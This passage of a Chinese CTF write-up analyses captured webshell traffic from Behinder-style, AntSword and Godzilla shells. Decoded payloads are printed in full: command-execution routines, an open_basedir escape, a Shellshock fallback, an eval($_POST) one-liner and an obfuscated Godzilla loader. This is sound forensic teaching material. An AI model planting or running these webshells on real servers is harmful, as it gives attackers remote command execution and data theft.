$c = $cmd;</span><br><span class="line">    if (FALSE !== strpos(strtolower(PHP_OS), &#x27;win&#x27;)) &#123;</span><br><span class="line">        $c = $c . &quot; 2&gt;&amp;1\n&quot;;</span><br><span class="line">    &#125;</span><br><span class="line">    $JueQDBH = &#x27;is_callable&#x27;;</span><br><span class="line">    $Bvce = &#x27;in_array&#x27;;</span><br><span class="line">    if ($JueQDBH(&#x27;system&#x27;) and ! $Bvce(&#x27;system&#x27;, $PadtJn)) &#123;</span><br><span class="line">        ob_start();</span><br><span class="line">        system($c);</span><br><span class="line">        $kWJW = ob_get_contents();</span><br><span class="line">        ob_end_clean();</span><br><span class="line">    &#125; else if ($JueQDBH(&#x27;proc_open&#x27;) and ! $Bvce(&#x27;proc_open&#x27;, $PadtJn)) &#123;</span><br><span class="line">        $handle = proc_open($c, array(</span><br><span class="line">            array(</span><br><span class="line">                &#x27;pipe&#x27;,</span><br><span class="line">                &#x27;r&#x27;</span><br><span class="line">            ),</span><br><span class="line">            array(</span><br><span class="line">                &#x27;pipe&#x27;,</span><br><span class="line">                &#x27;w&#x27;</span><br><span class="line">            ),</span><br><span class="line">            array(</span><br><span class="line">                &#x27;pipe&#x27;,</span><br><span class="line">                &#x27;w&#x27;</span><br><span class="line">            )</span><br><span class="line">        ), $pipes);</span><br><span class="line">        $kWJW = NULL;</span><br><span class="line">        while (! feof($pipes[1])) &#123;</span><br><span class="line">            $kWJW .= fread($pipes[1], 1024);</span><br><span class="line">        &#125;</span><br><span class="line">        @proc_close($handle);</span><br><span class="line">    &#125; else if ($JueQDBH(&#x27;passthru&#x27;) and ! $Bvce(&#x27;passthru&#x27;, $PadtJn)) &#123;</span><br><span class="line">        ob_start();</span><br><span class="line">        passthru($c);</span><br><span class="line">        $kWJW = ob_get_contents();</span><br><span class="line">        ob_end_clean();</span><br><span class="line">    &#125; else if ($JueQDBH(&#x27;shell_exec&#x27;) and ! $Bvce(&#x27;shell_exec&#x27;, $PadtJn)) &#123;</span><br><span class="line">        $kWJW = shell_exec($c);</span><br><span class="line">    &#125; else if ($JueQDBH(&#x27;exec&#x27;) and ! $Bvce(&#x27;exec&#x27;, $PadtJn)) &#123;</span><br><span class="line">        $kWJW = array();</span><br><span class="line">        exec($c, $kWJW);</span><br><span class="line">        $kWJW = join(chr(10), $kWJW) . chr(10);</span><br><span class="line">    &#125; else if ($JueQDBH(&#x27;exec&#x27;) and ! $Bvce(&#x27;popen&#x27;, $PadtJn)) &#123;</span><br><span class="line">        $fp = popen($c, &#x27;r&#x27;);</span><br><span class="line">        $kWJW = NULL;</span><br><span class="line">        if (is_resource($fp)) &#123;</span><br><span class="line">            while (! feof($fp)) &#123;</span><br><span class="line">                $kWJW .= fread($fp, 1024);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        @pclose($fp);</span><br><span class="line">    &#125; else &#123;</span><br><span class="line">        $kWJW = 0;</span><br><span class="line">        $result[&quot;status&quot;] = base64_encode(&quot;fail&quot;);</span><br><span class="line">        $result[&quot;msg&quot;] = base64_encode(&quot;none of proc_open/passthru/shell_exec/exec/exec is available&quot;);</span><br><span class="line">        $key = $_SESSION[&#x27;k&#x27;];</span><br><span class="line">        echo encrypt(json_encode($result), $key);</span><br><span class="line">        return;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">    $result[&quot;status&quot;] = base64_encode(&quot;success&quot;);</span><br><span class="line">    $result[&quot;msg&quot;] = base64_encode(getSafeStr($kWJW));</span><br><span class="line">    echo encrypt(json_encode($result),  $_SESSION[&#x27;k&#x27;]);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">function encrypt($data,$key)</span><br><span class="line">&#123;</span><br><span class="line">        if(!extension_loaded(&#x27;openssl&#x27;))</span><br><span class="line">        &#123;</span><br><span class="line">                for($i=0;$i&lt;strlen($data);$i++) &#123;</span><br><span class="line">                         $data[$i] = $data[$i]^$key[$i+1&amp;15];</span><br><span class="line">                        &#125;</span><br><span class="line">                        return $data;</span><br><span class="line">        &#125;</span><br><span class="line">    else</span><br><span class="line">        &#123;</span><br><span class="line">                return openssl_encrypt($data, &quot;AES128&quot;, $key);</span><br><span class="line">        &#125;</span><br><span class="line">&#125;$cmd=&quot;cat GronKey.txt&quot;;</span><br><span class="line">main($cmd);</span><br></pre></td></tr></table></figure>

<p>对应返回包</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">php decropt.php -k 2295d22e2d70888f -a w5lcFkJ5g/LtCqI0NgGN0nr2fGo9r1/AzKUMpzC878J4hU17Fu2Q89EMiYBl3hWbGAewU7bpnuWx4oBUmohKkg==</span><br></pre></td></tr></table></figure>

<p>解密结果</p>
<p>$cmd&#x3D;”cat GronKey.txt”;</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#123;&quot;status&quot;:&quot;success&quot;,&quot;msg&quot;:&quot;1,50,61,8,9,20,63,41&quot;&#125;</span><br></pre></td></tr></table></figure>

<p>tcp流三</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#125;$cmd=&quot;cat flag.txt&quot;;</span><br><span class="line">main($cmd);</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#123;&quot;status&quot;:&quot;success&quot;,&quot;msg&quot;:&quot;TGLBOMSJNSRAJAZDEZXGHSJNZWHG&quot;&#125;</span><br></pre></td></tr></table></figure>

<p>tcp流2</p>
<p>Vigenere解密</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">s = [1,50,61,8,9,20,63,41]</span><br><span class="line">import string</span><br><span class="line">dic = string.ascii_lowercase</span><br><span class="line">key = &#x27;&#x27;</span><br><span class="line">for k in s:</span><br><span class="line">    key += dic[k%26]</span><br><span class="line">print(key)</span><br></pre></td></tr></table></figure>

<p>解的维吉尼亚的key </p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">def decrypt_string(ciphertext, offsets):</span><br><span class="line">    decrypted_string = &quot;&quot;</span><br><span class="line">    offset_index = 0</span><br><span class="line"></span><br><span class="line">    for char in ciphertext:</span><br><span class="line">        offset = offsets[offset_index] % 26</span><br><span class="line">        decrypted_char_code = (ord(char) - ord(&#x27;A&#x27;) - offset) % 26 + ord(&#x27;A&#x27;)</span><br><span class="line">        decrypted_char = chr(decrypted_char_code)</span><br><span class="line">        decrypted_string += decrypted_char</span><br><span class="line"></span><br><span class="line">        offset_index = (offset_index + 1) % len(offsets)</span><br><span class="line"></span><br><span class="line">    return decrypted_string</span><br><span class="line"></span><br><span class="line">ciphertext = &quot;TGLBOMSJNSRAJAZDEZXGHSJNZWHG&quot;</span><br><span class="line">offsets = [1, 50, 61, 8, 9, 20, 63]</span><br><span class="line">decrypted_string = decrypt_string(ciphertext, offsets)</span><br><span class="line">print(decrypted_string)</span><br></pre></td></tr></table></figure>



<h1 id="蚁剑流量"><a href="#蚁剑流量" class="headerlink" title="蚁剑流量"></a>蚁剑流量</h1><p>流量特征</p>
<p><a href="https://blog.csdn.net/UserNick157/article/details/124405353">中国蚁剑流量分析-CSDN博客</a></p>
<p>一道蚁剑流量分析题目，找到secret文件中的内容即为flag</p>
<p>打开流量包，追踪http流发现是蚁剑类型的流量分析，先看一下追踪流的结果</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">g883299482ed9b=KGL2Jpbi9zaA%3D%3D&amp;h37e8ca57159a8=WqY2QgIi92YXIvd3d3L2h0bWwiO2NhdCAvc2VjcmV0O2VjaG8gZDBmNGE2OGE7cHdkO2VjaG8gMjVlNzA%3D&amp;n3wst4r=%40ini_set(%22display_errors%22%2C%20%220%22)%3B%40set_time_limit(0)%3B%24opdir%3D%40ini_get(%22open_basedir%22)%3Bif(%24opdir)%20%7B%24ocwd%3Ddirname(%24_SERVER%5B%22SCRIPT_FILENAME%22%5D)%3B%24oparr%3Dpreg_split(%22%2F%3B%7C%3A%2F%22%2C%24opdir)%3B%40array_push(%24oparr%2C%24ocwd%2Csys_get_temp_dir())%3Bforeach(%24oparr%20as%20%24item)%20%7Bif(!%40is_writable(%24item))%7Bcontinue%3B%7D%3B%24tmdir%3D%24item.%22%2F.46088%22%3B%40mkdir(%24tmdir)%3Bif(!%40file_exists(%24tmdir))%7Bcontinue%3B%7D%40chdir(%24tmdir)%3B%40ini_set(%22open_basedir%22%2C%20%22..%22)%3B%24cntarr%3D%40preg_split(%22%2F%5C%5C%5C%5C%7C%5C%2F%2F%22%2C%24tmdir)%3Bfor(%24i%3D0%3B%24i%3Csizeof(%24cntarr)%3B%24i%2B%2B)%7B%40chdir(%22..%22)%3B%7D%3B%40ini_set(%22open_basedir%22%2C%22%2F%22)%3B%40rmdir(%24tmdir)%3Bbreak%3B%7D%3B%7D%3B%3Bfunction%20asenc(%24out)%7Breturn%20%24out%3B%7D%3Bfunction%20asoutput()%7B%24output%3Dob_get_contents()%3Bob_end_clean()%3Becho%20%2269ff5%22.%228ed3f0%22%3Becho%20%40asenc(%24output)%3Becho%20%2294%22.%22d8f%22%3B%7Dob_start()%3Btry%7B%24p%3Dbase64_decode(substr(%24_POST%5B%22g883299482ed9b%22%5D%2C2))%3B%24s%3Dbase64_decode(substr(%24_POST%5B%22h37e8ca57159a8%22%5D%2C2))%3B%24envstr%3D%40base64_decode(substr(%24_POST%5B%22yba4b314a083ba%22%5D%2C2))%3B%24d%3Ddirname(%24_SERVER%5B%22SCRIPT_FILENAME%22%5D)%3B%24c%3Dsubstr(%24d%2C0%2C1)%3D%3D%22%2F%22%3F%22-c%20%5C%22%7B%24s%7D%5C%22%22%3A%22%2Fc%20%5C%22%7B%24s%7D%5C%22%22%3Bif(substr(%24d%2C0%2C1)%3D%3D%22%2F%22)%7B%40putenv(%22PATH%3D%22.getenv(%22PATH%22).%22%3A%2Fusr%2Flocal%2Fsbin%3A%2Fusr%2Flocal%2Fbin%3A%2Fusr%2Fsbin%3A%2Fusr%2Fbin%3A%2Fsbin%3A%2Fbin%22)%3B%7Delse%7B%40putenv(%22PATH%3D%22.getenv(%22PATH%22).%22%3BC%3A%2FWindows%2Fsystem32%3BC%3A%2FWindows%2FSysWOW64%3BC%3A%2FWindows%3BC%3A%2FWindows%2FSystem32%2FWindowsPowerShell%2Fv1.0%2F%3B%22)%3B%7Dif(!empty(%24envstr))%7B%24envarr%3Dexplode(%22%7C%7C%7Casline%7C%7C%7C%22%2C%20%24envstr)%3Bforeach(%24envarr%20as%20%24v)%20%7Bif%20(!empty(%24v))%20%7B%40putenv(str_replace(%22%7C%7C%7Caskey%7C%7C%7C%22%2C%20%22%3D%22%2C%20%24v))%3B%7D%7D%7D%24r%3D%22%7B%24p%7D%20%7B%24c%7D%22%3Bfunction%20fe(%24f)%7B%24d%3Dexplode(%22%2C%22%2C%40ini_get(%22disable_functions%22))%3Bif(empty(%24d))%7B%24d%3Darray()%3B%7Delse%7B%24d%3Darray_map(&#x27;trim&#x27;%2Carray_map(&#x27;strtolower&#x27;%2C%24d))%3B%7Dreturn(function_exists(%24f)%26%26is_callable(%24f)%26%26!in_array(%24f%2C%24d))%3B%7D%3Bfunction%20runshellshock(%24d%2C%20%24c)%20%7Bif%20(substr(%24d%2C%200%2C%201)%20%3D%3D%20%22%2F%22%20%26%26%20fe(&#x27;putenv&#x27;)%20%26%26%20(fe(&#x27;error_log&#x27;)%20%7C%7C%20fe(&#x27;mail&#x27;)))%20%7Bif%20(strstr(readlink(%22%2Fbin%2Fsh%22)%2C%20%22bash%22)%20!%3D%20FALSE)%20%7B%24tmp%20%3D%20tempnam(sys_get_temp_dir()%2C%20&#x27;as&#x27;)%3Bputenv(%22PHP_LOL%3D()%20%7B%20x%3B%20%7D%3B%20%24c%20%3E%24tmp%202%3E%261%22)%3Bif%20(fe(&#x27;error_log&#x27;))%20%7Berror_log(%22a%22%2C%201)%3B%7D%20else%20%7Bmail(%22a%40127.0.0.1%22%2C%20%22%22%2C%20%22%22%2C%20%22-bv%22)%3B%7D%7D%20else%20%7Breturn%20False%3B%7D%24output%20%3D%20%40file_get_contents(%24tmp)%3B%40unlink(%24tmp)%3Bif%20(%24output%20!%3D%20%22%22)%20%7Bprint(%24output)%3Breturn%20True%3B%7D%7Dreturn%20False%3B%7D%3Bfunction%20runcmd(%24c)%7B%24ret%3D0%3B%24d%3Ddirname(%24_SERVER%5B%22SCRIPT_FILENAME%22%5D)%3Bif(fe(&#x27;system&#x27;))%7B%40system(%24c%2C%24ret)%3B%7Delseif(fe(&#x27;passthru&#x27;))%7B%40passthru(%24c%2C%24ret)%3B%7Delseif(fe(&#x27;shell_exec&#x27;))%7Bprint(%40shell_exec(%24c))%3B%7Delseif(fe(&#x27;exec&#x27;))%7B%40exec(%24c%2C%24o%2C%24ret)%3Bprint(join(%22%0A%22%2C%24o))%3B%7Delseif(fe(&#x27;popen&#x27;))%7B%24fp%3D%40popen(%24c%2C&#x27;r&#x27;)%3Bwhile(!%40feof(%24fp))%7Bprint(%40fgets(%24fp%2C2048))%3B%7D%40pclose(%24fp)%3B%7Delseif(fe(&#x27;proc_open&#x27;))%7B%24p%20%3D%20%40proc_open(%24c%2C%20array(1%20%3D%3E%20array(&#x27;pipe&#x27;%2C%20&#x27;w&#x27;)%2C%202%20%3D%3E%20array(&#x27;pipe&#x27;%2C%20&#x27;w&#x27;))%2C%20%24io)%3Bwhile(!%40feof(%24io%5B1%5D))%7Bprint(%40fgets(%24io%5B1%5D%2C2048))%3B%7Dwhile(!%40feof(%24io%5B2%5D))%7Bprint(%40fgets(%24io%5B2%5D%2C2048))%3B%7D%40fclose(%24io%5B1%5D)%3B%40fclose(%24io%5B2%5D)%3B%40proc_close(%24p)%3B%7Delseif(fe(&#x27;antsystem&#x27;))%7B%40antsystem(%24c)%3B%7Delseif(runshellshock(%24d%2C%20%24c))%20%7Breturn%20%24ret%3B%7Delseif(substr(%24d%2C0%2C1)!%3D%22%2F%22%20%26%26%20%40class_exists(%22COM%22))%7B%24w%3Dnew%20COM(&#x27;WScript.shell&#x27;)%3B%24e%3D%24w-%3Eexec(%24c)%3B%24so%3D%24e-%3EStdOut()%3B%24ret.%3D%24so-%3EReadAll()%3B%24se%3D%24e-%3EStdErr()%3B%24ret.%3D%24se-%3EReadAll()%3Bprint(%24ret)%3B%7Delse%7B%24ret%20%3D%20127%3B%7Dreturn%20%24ret%3B%7D%3B%24ret%3D%40runcmd(%24r.%22%202%3E%261%22)%3Bprint%20(%24ret!%3D0)%3F%22ret%3D%7B%24ret%7D%22%3A%22%22%3B%3B%7Dcatch(Exception%20%24e)%7Becho%20%22ERROR%3A%2F%2F%22.%24e-%3EgetMessage()%3B%7D%3Basoutput()%3Bdie()%3B&amp;yba4b314a083ba=Jx</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>是一些url加密后的数据，解密之后如下</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">g883299482ed9b=KGL2Jpbi9zaA==&amp;h37e8ca57159a8=WqY2QgIi92YXIvd3d3L2h0bWwiO2NhdCAvc2VjcmV0O2VjaG8gZDBmNGE2OGE7cHdkO2VjaG8gMjVlNzA=&amp;n3wst4r=@ini_set(&quot;display_errors&quot;, &quot;0&quot;);@set_time_limit(0);$opdir=@ini_get(&quot;open_basedir&quot;);if($opdir) &#123;$ocwd=dirname($_SERVER[&quot;SCRIPT_FILENAME&quot;]);$oparr=preg_split(&quot;/;|:/&quot;,$opdir);@array_push($oparr,$ocwd,sys_get_temp_dir());foreach($oparr as $item) &#123;if(!@is_writable($item))&#123;continue;&#125;;$tmdir=$item.&quot;/.46088&quot;;@mkdir($tmdir);if(!@file_exists($tmdir))&#123;continue;&#125;@chdir($tmdir);@ini_set(&quot;open_basedir&quot;, &quot;..&quot;);$cntarr=@preg_split(&quot;/\\\\|\//&quot;,$tmdir);for($i=0;$i&lt;sizeof($cntarr);$i++)&#123;@chdir(&quot;..&quot;);&#125;;@ini_set(&quot;open_basedir&quot;,&quot;/&quot;);@rmdir($tmdir);break;&#125;;&#125;;;function asenc($out)&#123;return $out;&#125;;function asoutput()&#123;$output=ob_get_contents();ob_end_clean();echo &quot;69ff5&quot;.&quot;8ed3f0&quot;;echo @asenc($output);echo &quot;94&quot;.&quot;d8f&quot;;&#125;ob_start();try&#123;$p=base64_decode(substr($_POST[&quot;g883299482ed9b&quot;],2));$s=base64_decode(substr($_POST[&quot;h37e8ca57159a8&quot;],2));$envstr=@base64_decode(substr($_POST[&quot;yba4b314a083ba&quot;],2));$d=dirname($_SERVER[&quot;SCRIPT_FILENAME&quot;]);$c=substr($d,0,1)==&quot;/&quot;?&quot;-c \&quot;&#123;$s&#125;\&quot;&quot;:&quot;/c \&quot;&#123;$s&#125;\&quot;&quot;;if(substr($d,0,1)==&quot;/&quot;)&#123;@putenv(&quot;PATH=&quot;.getenv(&quot;PATH&quot;).&quot;:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin&quot;);&#125;else&#123;@putenv(&quot;PATH=&quot;.getenv(&quot;PATH&quot;).&quot;;C:/Windows/system32;C:/Windows/SysWOW64;C:/Windows;C:/Windows/System32/WindowsPowerShell/v1.0/;&quot;);&#125;if(!empty($envstr))&#123;$envarr=explode(&quot;|||asline|||&quot;, $envstr);foreach($envarr as $v) &#123;if (!empty($v)) &#123;@putenv(str_replace(&quot;|||askey|||&quot;, &quot;=&quot;, $v));&#125;&#125;&#125;$r=&quot;&#123;$p&#125; &#123;$c&#125;&quot;;function fe($f)&#123;$d=explode(&quot;,&quot;,@ini_get(&quot;disable_functions&quot;));if(empty($d))&#123;$d=array();&#125;else&#123;$d=array_map(&#x27;trim&#x27;,array_map(&#x27;strtolower&#x27;,$d));&#125;return(function_exists($f)&amp;&amp;is_callable($f)&amp;&amp;!in_array($f,$d));&#125;;function runshellshock($d, $c) &#123;if (substr($d, 0, 1) == &quot;/&quot; &amp;&amp; fe(&#x27;putenv&#x27;) &amp;&amp; (fe(&#x27;error_log&#x27;) || fe(&#x27;mail&#x27;))) &#123;if (strstr(readlink(&quot;/bin/sh&quot;), &quot;bash&quot;) != FALSE) &#123;$tmp = tempnam(sys_get_temp_dir(), &#x27;as&#x27;);putenv(&quot;PHP_LOL=() &#123; x; &#125;; $c &gt;$tmp 2&gt;&amp;1&quot;);if (fe(&#x27;error_log&#x27;)) &#123;error_log(&quot;a&quot;, 1);&#125; else &#123;mail(&quot;a@127.0.0.1&quot;, &quot;&quot;, &quot;&quot;, &quot;-bv&quot;);&#125;&#125; else &#123;return False;&#125;$output = @file_get_contents($tmp);@unlink($tmp);if ($output != &quot;&quot;) &#123;print($output);return True;&#125;&#125;return False;&#125;;function runcmd($c)&#123;$ret=0;$d=dirname($_SERVER[&quot;SCRIPT_FILENAME&quot;]);if(fe(&#x27;system&#x27;))&#123;@system($c,$ret);&#125;elseif(fe(&#x27;passthru&#x27;))&#123;@passthru($c,$ret);&#125;elseif(fe(&#x27;shell_exec&#x27;))&#123;print(@shell_exec($c));&#125;elseif(fe(&#x27;exec&#x27;))&#123;@exec($c,$o,$ret);print(join(&quot;</span><br><span class="line">&quot;,$o));&#125;elseif(fe(&#x27;popen&#x27;))&#123;$fp=@popen($c,&#x27;r&#x27;);while(!@feof($fp))&#123;print(@fgets($fp,2048));&#125;@pclose($fp);&#125;elseif(fe(&#x27;proc_open&#x27;))&#123;$p = @proc_open($c, array(1 =&gt; array(&#x27;pipe&#x27;, &#x27;w&#x27;), 2 =&gt; array(&#x27;pipe&#x27;, &#x27;w&#x27;)), $io);while(!@feof($io[1]))&#123;print(@fgets($io[1],2048));&#125;while(!@feof($io[2]))&#123;print(@fgets($io[2],2048));&#125;@fclose($io[1]);@fclose($io[2]);@proc_close($p);&#125;elseif(fe(&#x27;antsystem&#x27;))&#123;@antsystem($c);&#125;elseif(runshellshock($d, $c)) &#123;return $ret;&#125;elseif(substr($d,0,1)!=&quot;/&quot; &amp;&amp; @class_exists(&quot;COM&quot;))&#123;$w=new COM(&#x27;WScript.shell&#x27;);$e=$w-&gt;exec($c);$so=$e-&gt;StdOut();$ret.=$so-&gt;ReadAll();$se=$e-&gt;StdErr();$ret.=$se-&gt;ReadAll();print($ret);&#125;else&#123;$ret = 127;&#125;return $ret;&#125;;$ret=@runcmd($r.&quot; 2&gt;&amp;1&quot;);print ($ret!=0)?&quot;ret=&#123;$ret&#125;&quot;:&quot;&quot;;;&#125;catch(Exception $e)&#123;echo &quot;ERROR://&quot;.$e-&gt;getMessage();&#125;;asoutput();die();&amp;yba4b314a083ba=Jx</span><br><span class="line"></span><br></pre></td></tr></table></figure>



<p>下面的数据都不重要，主要看第一二行</p>
<p>g883299482ed9b&#x3D;KGL2Jpbi9zaA&#x3D;&#x3D;&amp;h37e8ca57159a8&#x3D;Wq<strong>Y2QgIi92YXIvd3d3L2h0bWwiO2NhdCAvc2VjcmV0O2VjaG8gZDBmNGE2OGE7cHdkO2VjaG8gMjVlNzA&#x3D;</strong>&amp;n3wst4r&#x3D;@ini_set(“display_errors”,</p>
<p>加粗的部分为base64加密的数据，并且一般是该参数两位之后的才是正确的命令的Base64编码</p>
<p>解码后为</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">cd &quot;/var/www/html&quot;;cat /secret;echo d0f4a68a;pwd;echo 25e70</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>cat了secret文件中的内容，再接着往下找流量，即可找到secret文件中的内容</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;code&gt;&lt;span style=&quot;color: #000000&quot;&gt;</span><br><span class="line">&lt;span style=&quot;color: #0000BB&quot;&gt;&amp;lt;?php&lt;br /&gt;highlight_file&lt;/span&gt;&lt;span style=&quot;color: #007700&quot;&gt;(&lt;/span&gt;&lt;span style=&quot;color: #0000BB&quot;&gt;__FILE__&lt;/span&gt;&lt;span style=&quot;color: #007700&quot;&gt;);&lt;br /&gt;eval(&lt;/span&gt;&lt;span style=&quot;color: #0000BB&quot;&gt;$_POST&lt;/span&gt;&lt;span style=&quot;color: #007700&quot;&gt;[&lt;/span&gt;&lt;span style=&quot;color: #DD0000&quot;&gt;&#x27;n3wst4r&#x27;&lt;/span&gt;&lt;span style=&quot;color: #007700&quot;&gt;]);&lt;br /&gt;&lt;/span&gt;&lt;span style=&quot;color: #0000BB&quot;&gt;?&amp;gt;&lt;/span&gt;</span><br><span class="line">&lt;/span&gt;</span><br><span class="line">&lt;/code&gt;69ff58ed3f0Y0UAr3G00D</span><br><span class="line">d0f4a68a</span><br><span class="line">/var/www/html</span><br><span class="line">25e70</span><br><span class="line">94d8f</span><br></pre></td></tr></table></figure>



<p>注意之前url解密后的内容中有</p>
<p>echo “69ff5”.”8ed3f0”;echo @asenc($output);echo “94”.”d8f”;}ob_start();try{$p&#x3D;base64_decode(substr($_POST[“g883299482ed9b”],2));$s&#x3D;base64_decode(substr($_POST[“h37e8ca57159a8”],2));$envstr&#x3D;@base64_decode(substr($_POST[“yba4b314a083ba”],2));$d&#x3D;dirname($_SERVER[“SCRIPT_FILENAME”]);$c&#x3D;substr($d,0,1)&#x3D;&#x3D;”&#x2F;“?”-c &quot;{$s}&quot;“:”&#x2F;c &quot;{$s}&quot;“;if(substr($d,0,1)&#x3D;&#x3D;”&#x2F;“)</p>
<p>也就是说code中的69ff58ed3f0是无用数据，因此secret中的内容为Y0UAr3G00D</p>
<p>因此flag为flag{Y0UAr3G00D}</p>
<p>来自于蓝桥杯的蚁剑流量分析</p>
<h1 id="哥斯拉"><a href="#哥斯拉" class="headerlink" title="哥斯拉"></a>哥斯拉</h1><p>流量特征</p>
<p>哥斯拉的作者应该还没有意识到，在请求包的Cookie中有一个非常致命的特征，最后的分号</p>
<p>通过Burp抓包可知，第1个请求会发送大量数据，该请求不含有任何Cookie信息，服务器响应报文不含任何数据，但是会设置PHPSESSID，后续请求都会自动带上该Cookie</p>
<p><a href="https://blog.csdn.net/sinat_31884905/article/details/132548617">【流量分析】Godzilla分析_哥斯拉流量特征-CSDN博客</a></p>
<p>追踪http流发现了哥斯拉特征的流量</p>
<p><img src="https://s2.loli.net/2024/04/09/aCjBYS48IhtGdfl.png"></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ctfsogood=eval%28base64_decode%28strrev%28urldecode%28%27K0QfK0QfgACIgoQD9BCIgACIgACIK0wOpkXZrRCLhRXYkRCKlR2bj5WZ90VZtFmTkF2bslXYwRyWO9USTNVRT9FJgACIgACIgACIgACIK0wepU2csFmZ90TIpIybm5WSzNWazFmQ0V2ZiwSY0FGZkgycvBnc0NHKgYWagACIgACIgAiCNsXZzxWZ9BCIgAiCNsTK2EDLpkXZrRiLzNXYwRCK1QWboIHdzJWdzByboNWZgACIgACIgAiCNsTKpkXZrRCLpEGdhRGJo4WdyBEKlR2bj5WZoUGZvNmbl9FN2U2chJGIvh2YlBCIgACIgACIK0wOpYTMsADLpkXZrRiLzNXYwRCK1QWboIHdzJWdzByboNWZgACIgACIgAiCNsTKkF2bslXYwRCKsFmdllQCK0QfgACIgACIgAiCNsTK5V2akwCZh9Gb5FGckgSZk92YuVWPkF2bslXYwRCIgACIgACIgACIgAiCNsXKlNHbhZWP90TKi8mZul0cjl2chJEdldmIsQWYvxWehBHJoM3bwJHdzhCImlGIgACIgACIgoQD7kSeltGJs0VZtFmTkF2bslXYwRyWO9USTNVRT9FJoUGZvNmbl1DZh9Gb5FGckACIgACIgACIK0wepkSXl1WYORWYvxWehBHJb50TJN1UFN1XkgCdlN3cphCImlGIgACIK0wOpkXZrRCLp01czFGcksFVT9EUfRCKlR2bjVGZfRjNlNXYihSZk92YuVWPhRXYkRCIgACIK0wepkSXzNXYwRyWUN1TQ9FJoQXZzNXaoAiZppQD7ciZjNjY0UGOiFjZ3IWZxIDNn0TeltGJK0wOnQWYvxWehB3J9UWbh5EZh9Gb5FGckoQD7cCbsVGazlnYhJ2J9M3chBHJK0QfK0wOERCIuJXd0VmcgACIgoQD9BCIgAiCNszYk4VXpRyWERCI9ASXpRyWERCIgACIgACIgoQD70VNxYSMrkGJbtEJg0DIjRCIgACIgACIgoQD7BSKrsSaksTKERCKuVGbyR3c8kGJ7ATPpRCKy9mZgACIgoQD7lySkwCRkgSZk92YuVGIu9Wa0Nmb1ZmCNsTKwgyZulGdy9GclJ3Xy9mcyVGQK0wOpADK0lWbpx2Xl1Wa09FdlNHQK0wOpgCdyFGdz9lbvl2czV2cApQD%27%29%29%29%29%3B&amp;babyshell=X1QRClgCfwNVADZmM2NmQFdCEQ%3D%3D</span><br></pre></td></tr></table></figure>

<p>url解密一下</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ctfsogood=eval(base64_decode(strrev(urldecode(&#x27;K0QfK0QfgACIgoQD9BCIgACIgACIK0wOpkXZrRCLhRXYkRCKlR2bj5WZ90VZtFmTkF2bslXYwRyWO9USTNVRT9FJgACIgACIgACIgACIK0wepU2csFmZ90TIpIybm5WSzNWazFmQ0V2ZiwSY0FGZkgycvBnc0NHKgYWagACIgACIgAiCNsXZzxWZ9BCIgAiCNsTK2EDLpkXZrRiLzNXYwRCK1QWboIHdzJWdzByboNWZgACIgACIgAiCNsTKpkXZrRCLpEGdhRGJo4WdyBEKlR2bj5WZoUGZvNmbl9FN2U2chJGIvh2YlBCIgACIgACIK0wOpYTMsADLpkXZrRiLzNXYwRCK1QWboIHdzJWdzByboNWZgACIgACIgAiCNsTKkF2bslXYwRCKsFmdllQCK0QfgACIgACIgAiCNsTK5V2akwCZh9Gb5FGckgSZk92YuVWPkF2bslXYwRCIgACIgACIgACIgAiCNsXKlNHbhZWP90TKi8mZul0cjl2chJEdldmIsQWYvxWehBHJoM3bwJHdzhCImlGIgACIgACIgoQD7kSeltGJs0VZtFmTkF2bslXYwRyWO9USTNVRT9FJoUGZvNmbl1DZh9Gb5FGckACIgACIgACIK0wepkSXl1WYORWYvxWehBHJb50TJN1UFN1XkgCdlN3cphCImlGIgACIK0wOpkXZrRCLp01czFGcksFVT9EUfRCKlR2bjVGZfRjNlNXYihSZk92YuVWPhRXYkRCIgACIK0wepkSXzNXYwRyWUN1TQ9FJoQXZzNXaoAiZppQD7ciZjNjY0UGOiFjZ3IWZxIDNn0TeltGJK0wOnQWYvxWehB3J9UWbh5EZh9Gb5FGckoQD7cCbsVGazlnYhJ2J9M3chBHJK0QfK0wOERCIuJXd0VmcgACIgoQD9BCIgAiCNszYk4VXpRyWERCI9ASXpRyWERCIgACIgACIgoQD70VNxYSMrkGJbtEJg0DIjRCIgACIgACIgoQD7BSKrsSaksTKERCKuVGbyR3c8kGJ7ATPpRCKy9mZgACIgoQD7lySkwCRkgSZk92YuVGIu9Wa0Nmb1ZmCNsTKwgyZulGdy9GclJ3Xy9mcyVGQK0wOpADK0lWbpx2Xl1Wa09FdlNHQK0wOpgCdyFGdz9lbvl2czV2cApQD&#x27;))));&amp;babyshell=X1QRClgCfwNVADZmM2NmQFdCEQ==</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>可以看到是先对密文反转再base64解密，我们把密文还原回来</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line"></span><br><span class="line">@<span class="title function_ invoke__">session_start</span>();</span><br><span class="line"></span><br><span class="line">@<span class="title function_ invoke__">set_time_limit</span>(<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">@<span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">encode</span>(<span class="params"><span class="variable">$D</span>,<span class="variable">$K</span></span>)</span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span>(<span 